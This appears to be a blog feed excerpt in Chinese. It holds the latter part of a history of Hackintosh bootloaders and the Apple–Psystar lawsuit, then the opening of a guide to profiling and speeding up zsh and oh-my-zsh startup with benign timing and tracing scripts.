同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 